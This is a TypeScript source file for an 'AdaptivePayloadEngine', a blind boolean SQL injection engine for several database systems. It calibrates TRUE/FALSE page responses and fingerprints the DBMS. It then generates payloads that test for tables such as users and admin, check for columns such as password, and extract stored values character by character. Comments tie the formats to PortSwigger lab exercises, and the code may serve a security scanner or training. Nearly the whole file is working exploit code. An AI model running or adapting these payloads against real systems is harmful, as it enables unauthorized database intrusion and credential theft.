/**
 * AdaptivePayloadEngine — Intelligent Response-Driven SQL Injection Probe Engine
 *
 * Replaces static payload arrays with a calibrated, DBMS-aware adaptive loop that
 * learns from verified TRUE/FALSE response baselines and dynamically generates
 * the optimal next probe.
 */

import { DbmsType } from '../../types/sqlScanner';

// ─── Response Signature ───────────────────────────────────────────────
export interface ResponseSignature {
  bodyLength: number;
  normalizedBody: string;
  statusCode: number;
  containsMarker: boolean;
}

export interface CalibrationResult {
  /** The text marker found only in TRUE responses (e.g. "Welcome back") */
  marker: string;
  /** Strategy used: 'marker' | 'length' | 'status' | 'signature' */
  strategy: 'marker' | 'length' | 'status' | 'signature';
  /** Average TRUE response length */
  trueLengthMean: number;
  /** Average FALSE response length */
  falseLengthMean: number;
  /** Length threshold for classification */
  lengthThreshold: number;
  /** Confidence in the calibration (0-100) */
  confidence: number;
  /** Quote style that works: 'balanced' or 'commented' */
  quoteStyle: 'balanced' | 'commented';
}

export type ClassificationResult = 'TRUE' | 'FALSE' | 'UNKNOWN';

// ─── DBMS Dialect Syntax ──────────────────────────────────────────────
interface DialectSyntax {
  limit1: string;
  substringFn: string;
  lengthFn: string;
  concatOp: string;
  commentSingle: string;
  stringAgg: string;
  infoSchemaQuery: string;
  infoSchemaColQuery: string;
  versionFn: string;
}

const DIALECT_MAP: Record<string, DialectSyntax> = {
  'PostgreSQL': {
    limit1: 'LIMIT 1',
    substringFn: 'SUBSTRING',
    lengthFn: 'LENGTH',
    concatOp: '||',
    commentSingle: '--',
    stringAgg: 'STRING_AGG',
    infoSchemaQuery: "SELECT table_name FROM information_schema.tables WHERE table_schema='public'",
    infoSchemaColQuery: "SELECT column_name FROM information_schema.columns WHERE table_name='{TABLE}'",
    versionFn: 'version()',
  },
  'MySQL': {
    limit1: 'LIMIT 1',
    substringFn: 'SUBSTRING',
    lengthFn: 'LENGTH',
    concatOp: ',',
    commentSingle: '#',
    stringAgg: 'GROUP_CONCAT',
    infoSchemaQuery: "SELECT table_name FROM information_schema.tables WHERE table_schema=database()",
    infoSchemaColQuery: "SELECT column_name FROM information_schema.columns WHERE table_name='{TABLE}' AND table_schema=database()",
    versionFn: '@@version',
  },
  'Oracle': {
    limit1: 'WHERE ROWNUM=1',
    substringFn: 'SUBSTR',
    lengthFn: 'LENGTH',
    concatOp: '||',
    commentSingle: '--',
    stringAgg: 'LISTAGG',
    infoSchemaQuery: "SELECT table_name FROM user_tables",
    infoSchemaColQuery: "SELECT column_name FROM user_tab_columns WHERE table_name=UPPER('{TABLE}')",
    versionFn: 'banner FROM v$version WHERE ROWNUM=1',
  },
  'Microsoft SQL Server': {
    limit1: 'TOP 1',
    substringFn: 'SUBSTRING',
    lengthFn: 'LEN',
    concatOp: '+',
    commentSingle: '--',
    stringAgg: 'STRING_AGG',
    infoSchemaQuery: "SELECT table_name FROM information_schema.tables WHERE table_type='BASE TABLE'",
    infoSchemaColQuery: "SELECT column_name FROM information_schema.columns WHERE table_name='{TABLE}'",
    versionFn: '@@version',
  },
  'SQLite': {
    limit1: 'LIMIT 1',
    substringFn: 'SUBSTR',
    lengthFn: 'LENGTH',
    concatOp: '||',
    commentSingle: '--',
    stringAgg: 'GROUP_CONCAT',
    infoSchemaQuery: "SELECT name FROM sqlite_master WHERE type='table'",
    infoSchemaColQuery: "SELECT name FROM pragma_table_info('{TABLE}')",
    versionFn: 'sqlite_version()',
  },
};

const DYNAMIC_PATTERNS = [
  /csrf[_-]?token["\s:=]+["']?[a-zA-Z0-9_\-+/=]{16,}["']?/gi,
  /\b[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}\b/gi,
  /\b\d{13,}\b/g,
  /nonce["\s:=]+["']?[a-zA-Z0-9+/=]{8,}["']?/gi,
  /Set-Cookie:\s*[^\r\n]+/gi,
  /(?:^|\s)Date:\s*[^\r\n]+/gim,
  /(?:^|\s)X-Request-Id:\s*[^\r\n]+/gim,
  /(?:^|\s)ETag:\s*[^\r\n]+/gim,
  /analytics[_-]?id["\s:=]+["']?[a-zA-Z0-9_\-]{8,}["']?/gi,
];

const HIGH_PRIORITY_TABLES = [
  'users', 'accounts', 'admin', 'administrators', 'credentials', 'login',
];
const MEDIUM_PRIORITY_TABLES = [
  'customers', 'members', 'profiles', 'sessions', 'auth', 'tokens',
  'user', 'account', 'customer', 'member', 'logins',
];
const LOW_PRIORITY_TABLES = [
  'products', 'orders', 'items', 'categories', 'payments', 'logs',
  'settings', 'config', 'permissions', 'roles', 'groups',
];

const COLUMN_SETS: Record<string, string[]> = {
  auth: ['username', 'user_name', 'login', 'user', 'password', 'pass', 'passwd', 'password_hash', 'pwd', 'secret', 'email', 'id', 'name', 'role', 'is_admin', 'admin', 'status', 'token', 'api_key', 'created_at'],
  commerce: ['id', 'name', 'title', 'price', 'quantity', 'total', 'status', 'order_id', 'customer_id', 'user_id', 'created_at', 'description', 'category'],
  generic: ['id', 'name', 'value', 'type', 'status', 'created_at', 'updated_at', 'description', 'title', 'data'],
};

const EXTRACT_CHARSET = 'abcdefghijklmnopqrstuvwxyz0123456789'.split('');

export class AdaptivePayloadEngine {
  private calibration: CalibrationResult | null = null;
  private dialect: DialectSyntax;
  private dbms: DbmsType;
  private confirmedQuoteStyle: 'balanced' | 'commented' = 'balanced';

  constructor(dbms: DbmsType = 'PostgreSQL') {
    this.dbms = dbms;
    this.dialect = DIALECT_MAP[dbms] || DIALECT_MAP['PostgreSQL'];
  }

  public static stripDynamicContent(body: string): string {
    let stripped = body;
    for (const pattern of DYNAMIC_PATTERNS) {
      stripped = stripped.replace(pattern, '');
    }
    return stripped.replace(/\s+/g, ' ').trim();
  }

  public static computeSignature(body: string, statusCode: number, marker?: string): ResponseSignature {
    const normalized = AdaptivePayloadEngine.stripDynamicContent(body);
    return {
      bodyLength: normalized.length,
      normalizedBody: normalized,
      statusCode,
      containsMarker: marker ? body.toLowerCase().includes(marker.toLowerCase()) : false,
    };
  }

  public calibrate(
    trueBodies: { body: string; status: number }[],
    falseBodies: { body: string; status: number }[]
  ): CalibrationResult {
    const markers = [
      'Welcome back', 'Welcome', 'Logged in', 'Success', 'Authorized',
      'My account', 'Sign out', 'Log out', 'Hello', 'Dashboard',
      'Account found', 'User exists', 'Items found', 'Search results',
    ];

    let bestMarker = '';
    for (const m of markers) {
      const ml = m.toLowerCase();
      const trueHas = trueBodies.every(t => t.body.toLowerCase().includes(ml));
      const falseHas = falseBodies.some(f => f.body.toLowerCase().includes(ml));
      if (trueHas && !falseHas) {
        bestMarker = m;
        break;
      }
    }

    if (!bestMarker) {
      const trueStripped = AdaptivePayloadEngine.stripDynamicContent(trueBodies[0]?.body || '');
      const falseStripped = AdaptivePayloadEngine.stripDynamicContent(falseBodies[0]?.body || '');
      const trueWords = new Set(trueStripped.replace(/<[^>]+>/g, ' ').split(/\s+/).filter(w => w.length >= 5));
      const falseWords = new Set(falseStripped.replace(/<[^>]+>/g, ' ').split(/\s+/));
      for (const w of trueWords) {
        if (!falseWords.has(w) && trueBodies.every(t => t.body.includes(w)) && falseBodies.every(f => !f.body.includes(w))) {
          bestMarker = w;
          break;
        }
      }
    }

    const trueLengths = trueBodies.map(t => AdaptivePayloadEngine.stripDynamicContent(t.body).length);
    const falseLengths = falseBodies.map(f => AdaptivePayloadEngine.stripDynamicContent(f.body).length);
    const trueMean = trueLengths.reduce((a, b) => a + b, 0) / (trueLengths.length || 1);
    const falseMean = falseLengths.reduce((a, b) => a + b, 0) / (falseLengths.length || 1);
    const threshold = (trueMean + falseMean) / 2;

    let strategy: CalibrationResult['strategy'] = 'signature';
    let confidence = 60;

    if (bestMarker) {
      strategy = 'marker';
      confidence = 98;
    } else if (Math.abs(trueMean - falseMean) > 50) {
      strategy = 'length';
      confidence = 85;
    } else {
      const trueStatuses = new Set(trueBodies.map(t => t.status));
      const falseStatuses = new Set(falseBodies.map(f => f.status));
      if (trueStatuses.size === 1 && falseStatuses.size === 1 && !falseStatuses.has([...trueStatuses][0])) {
        strategy = 'status';
        confidence = 92;
      }
    }

    this.calibration = {
      marker: bestMarker,
      strategy,
      trueLengthMean: trueMean,
      falseLengthMean: falseMean,
      lengthThreshold: threshold,
      confidence,
      quoteStyle: this.confirmedQuoteStyle,
    };

    return this.calibration;
  }

  public classifyResponse(body: string, statusCode: number): ClassificationResult {
    if (!this.calibration) return 'UNKNOWN';
    const cal = this.calibration;

    if (cal.strategy === 'marker' && cal.marker) {
      return body.toLowerCase().includes(cal.marker.toLowerCase()) ? 'TRUE' : 'FALSE';
    }

    if (cal.strategy === 'status') {
      return statusCode === 200 ? 'TRUE' : 'FALSE';
    }

    const strippedLen = AdaptivePayloadEngine.stripDynamicContent(body).length;
    const trueDist = Math.abs(strippedLen - cal.trueLengthMean);
    const falseDist = Math.abs(strippedLen - cal.falseLengthMean);

    if (cal.strategy === 'length') {
      if (trueDist < falseDist && trueDist < cal.trueLengthMean * 0.05) return 'TRUE';
      if (falseDist < trueDist && falseDist < cal.falseLengthMean * 0.05) return 'FALSE';
      return 'UNKNOWN';
    }

    if (trueDist < falseDist) return 'TRUE';
    if (falseDist < trueDist) return 'FALSE';
    return 'UNKNOWN';
  }

  public setDbms(dbms: DbmsType): void {
    this.dbms = dbms;
    this.dialect = DIALECT_MAP[dbms] || DIALECT_MAP['PostgreSQL'];
  }

  public setQuoteStyle(style: 'balanced' | 'commented'): void {
    this.confirmedQuoteStyle = style;
  }

  public getDialect(): DialectSyntax { return this.dialect; }
  public getCalibration(): CalibrationResult | null { return this.calibration; }

  /**
   * Core payload wrapper. Two styles:
   * - balanced: `' AND condition` — relies on SQL's trailing quote to close (PortSwigger-exact)
   * - commented: `' AND condition--` — comments out the trailing quote
   *
   * IMPORTANT: `condition` must end WITHOUT a closing quote. The SQL trailing `'` provides it.
   * Example: condition = `(SELECT 'a' FROM users LIMIT 1)='a`  (no trailing quote)
   *          → payload = `' AND (SELECT 'a' FROM users LIMIT 1)='a`
   *          → SQL: WHERE TrackingId='xyz' AND (SELECT 'a' FROM users LIMIT 1)='a'
   *                                                        trailing quote from original query ↗
   */
  private probeSuffix(condition: string): string {
    if (this.confirmedQuoteStyle === 'commented') {
      return `' AND ${condition}${this.dialect.commentSingle}`;
    }
    // Balanced: the original SQL's trailing quote closes the last string in condition
    return `' AND ${condition}`;
  }

  // ─── Calibration Probes (PortSwigger-exact format) ────────────────
  public getCalibrationProbes(): { truePayload: string; falsePayload: string }[] {
    if (this.confirmedQuoteStyle === 'commented') {
      return [
        { truePayload: `' AND 1=1${this.dialect.commentSingle}`, falsePayload: `' AND 1=2${this.dialect.commentSingle}` },
        { truePayload: `' AND 'a'='a`, falsePayload: `' AND 'a'='b` },
        { truePayload: `' AND 2>1${this.dialect.commentSingle}`, falsePayload: `' AND 2<1${this.dialect.commentSingle}` },
      ];
    }
    // Balanced: exact PortSwigger format
    return [
      { truePayload: "' AND '1'='1", falsePayload: "' AND '1'='2" },
      { truePayload: "' AND 'a'='a", falsePayload: "' AND 'a'='b" },
      { truePayload: "' AND 1=1-- ", falsePayload: "' AND 1=2-- " },
    ];
  }

  public getDbmsProbes(): { dbms: DbmsType; truePayload: string; falsePayload: string }[] {
    return [
      { dbms: 'PostgreSQL', truePayload: this.probeSuffix("(SELECT 'a')='a"), falsePayload: this.probeSuffix("(SELECT 'a')='b") },
      { dbms: 'MySQL', truePayload: this.probeSuffix("(SELECT 'a')='a"), falsePayload: this.probeSuffix("(SELECT 'a')='b") },
      { dbms: 'Oracle', truePayload: this.probeSuffix("(SELECT 1 FROM DUAL)='a"), falsePayload: this.probeSuffix("(SELECT 2 FROM DUAL)='a") },
    ];
  }

  // ─── Table Existence (PortSwigger-exact) ──────────────────────────
  // PortSwigger: xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
  public generateTableProbe(tableName: string): { truePayload: string; falsePayload: string } {
    const d = this.dialect;
    let trueCondition: string;
    let falseCondition: string;

    if (this.dbms === 'Oracle') {
      trueCondition = `(SELECT 'a' FROM ${tableName} ${d.limit1})='a`;
      falseCondition = `(SELECT 'a' FROM ${tableName} ${d.limit1})='b`;
    } else if (this.dbms === 'Microsoft SQL Server') {
      trueCondition = `(SELECT ${d.limit1} 'a' FROM ${tableName})='a`;
      falseCondition = `(SELECT ${d.limit1} 'a' FROM ${tableName})='b`;
    } else {
      // PostgreSQL/MySQL/SQLite — exact PortSwigger format
      trueCondition = `(SELECT 'a' FROM ${tableName} ${d.limit1})='a`;
      falseCondition = `(SELECT 'a' FROM ${tableName} ${d.limit1})='b`;
    }
    return {
      truePayload: this.probeSuffix(trueCondition),
      falsePayload: this.probeSuffix(falseCondition),
    };
  }

  // ─── Column Existence (Boolean Inference) ─────────────────────────
  // xyz' AND (SELECT 'a' FROM users WHERE username IS NOT NULL LIMIT 1)='a
  public generateColumnProbe(tableName: string, columnName: string): { truePayload: string; falsePayload: string } {
    const d = this.dialect;
    let trueCondition: string;
    let falseCondition: string;

    if (this.dbms === 'Oracle') {
      trueCondition = `(SELECT 'a' FROM ${tableName} WHERE ${columnName} IS NOT NULL AND ${d.limit1.replace('WHERE ', '')})='a`;
      falseCondition = `(SELECT 'a' FROM ${tableName} WHERE ${columnName} IS NOT NULL AND ${d.limit1.replace('WHERE ', '')})='b`;
    } else if (this.dbms === 'Microsoft SQL Server') {
      trueCondition = `(SELECT ${d.limit1} 'a' FROM ${tableName} WHERE ${columnName} IS NOT NULL)='a`;
      falseCondition = `(SELECT ${d.limit1} 'a' FROM ${tableName} WHERE ${columnName} IS NOT NULL)='b`;
    } else {
      trueCondition = `(SELECT 'a' FROM ${tableName} WHERE ${columnName} IS NOT NULL ${d.limit1})='a`;
      falseCondition = `(SELECT 'a' FROM ${tableName} WHERE ${columnName} IS NOT NULL ${d.limit1})='b`;
    }
    return {
      truePayload: this.probeSuffix(trueCondition),
      falsePayload: this.probeSuffix(falseCondition),
    };
  }

  // ─── Entity Existence (PortSwigger-exact) ─────────────────────────
  // xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
  public generateEntityProbe(tableName: string, whereClause: string): { truePayload: string; falsePayload: string } {
    const d = this.dialect;
    let trueCondition: string;
    let falseCondition: string;

    if (this.dbms === 'Oracle') {
      trueCondition = `(SELECT 'a' FROM ${tableName} WHERE ${whereClause} AND ${d.limit1.replace('WHERE ', '')})='a`;
      falseCondition = `(SELECT 'a' FROM ${tableName} WHERE ${whereClause} AND ${d.limit1.replace('WHERE ', '')})='b`;
    } else if (this.dbms === 'Microsoft SQL Server') {
      trueCondition = `(SELECT ${d.limit1} 'a' FROM ${tableName} WHERE ${whereClause})='a`;
      falseCondition = `(SELECT ${d.limit1} 'a' FROM ${tableName} WHERE ${whereClause})='b`;
    } else {
      // PortSwigger-exact: (SELECT 'a' FROM users WHERE username='administrator')='a
      // No LIMIT 1 needed — the WHERE clause should narrow to 1 row
      trueCondition = `(SELECT 'a' FROM ${tableName} WHERE ${whereClause})='a`;
      falseCondition = `(SELECT 'a' FROM ${tableName} WHERE ${whereClause})='b`;
    }
    return {
      truePayload: this.probeSuffix(trueCondition),
      falsePayload: this.probeSuffix(falseCondition),
    };
  }

  // ─── Value Length Probe (PortSwigger-exact) ───────────────────────
  // xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
  public generateLengthProbe(tableName: string, columnName: string, whereClause: string, lengthGuess: number): string {
    const d = this.dialect;
    let condition: string;

    if (this.dbms === 'Oracle') {
      condition = `(SELECT 'a' FROM ${tableName} WHERE ${whereClause} AND ${d.lengthFn}(${columnName})>${lengthGuess} AND ${d.limit1.replace('WHERE ', '')})='a`;
    } else if (this.dbms === 'Microsoft SQL Server') {
      condition = `(SELECT ${d.limit1} 'a' FROM ${tableName} WHERE ${whereClause} AND ${d.lengthFn}(${columnName})>${lengthGuess})='a`;
    } else {
      // PortSwigger-exact format
      condition = `(SELECT 'a' FROM ${tableName} WHERE ${whereClause} AND ${d.lengthFn}(${columnName})>${lengthGuess})='a`;
    }
    return this.probeSuffix(condition);
  }

  // ─── Character Extraction Probe (PortSwigger-exact) ───────────────
  // xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
  public generateCharProbe(tableName: string, columnName: string, whereClause: string, position: number, char: string): string {
    const d = this.dialect;
    let condition: string;

    if (this.dbms === 'Oracle') {
      condition = `(SELECT ${d.substringFn}(${columnName},${position},1) FROM ${tableName} WHERE ${whereClause} AND ${d.limit1.replace('WHERE ', '')})='${char}`;
    } else if (this.dbms === 'Microsoft SQL Server') {
      condition = `(SELECT ${d.limit1} ${d.substringFn}(${columnName},${position},1) FROM ${tableName} WHERE ${whereClause})='${char}`;
    } else {
      // PortSwigger-exact: (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a
      condition = `(SELECT ${d.substringFn}(${columnName},${position},1) FROM ${tableName} WHERE ${whereClause})='${char}`;
    }
    return this.probeSuffix(condition);
  }

  public getColumnsForTable(tableName: string): string[] {
    const name = tableName.toLowerCase();
    if (name.includes('user') || name.includes('account') || name.includes('admin') || name.includes('credential') || name.includes('login') || name.includes('auth') || name.includes('member')) {
      return COLUMN_SETS.auth;
    }
    if (name.includes('product') || name.includes('order') || name.includes('item') || name.includes('payment') || name.includes('categor')) {
      return COLUMN_SETS.commerce;
    }
    return COLUMN_SETS.generic;
  }

  public static getHighPriorityTables(): string[] { return [...HIGH_PRIORITY_TABLES]; }
  public static getMediumPriorityTables(): string[] { return [...MEDIUM_PRIORITY_TABLES]; }
  public static getLowPriorityTables(): string[] { return [...LOW_PRIORITY_TABLES]; }
  public static getAllCandidateTables(): string[] { return [...HIGH_PRIORITY_TABLES, ...MEDIUM_PRIORITY_TABLES, ...LOW_PRIORITY_TABLES]; }
  public static getExtractCharset(): string[] { return [...EXTRACT_CHARSET]; }

  public getQuoteStyleProbes(): { balanced: string; commented: string } {
    return {
      balanced: "' AND '1'='1",
      commented: `' AND 1=1${this.dialect.commentSingle}`,
    };
  }
}
